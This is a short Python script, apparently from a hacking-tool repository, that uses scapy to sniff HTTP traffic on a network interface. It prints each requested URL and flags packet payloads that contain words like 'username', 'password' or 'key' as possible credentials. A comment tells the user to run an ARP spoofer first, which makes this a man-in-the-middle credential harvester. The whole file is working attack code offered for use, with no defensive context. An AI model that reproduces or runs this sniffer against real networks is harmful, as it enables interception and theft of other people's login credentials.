#!/usr/bin/env python

# you should run arp spoofer (script) before you run this
# script / code for the same rou can find it in the same repository with the name - arp_spoofer.py


import scapy.all as scapy
from scapy import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "id", "userid", "login", "mobile", "phone", "email", "mailid", "pass",
                    "password", "security", "key"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n Possible UserName / Password >> " + login_info + "\n")


sniff("eth0")
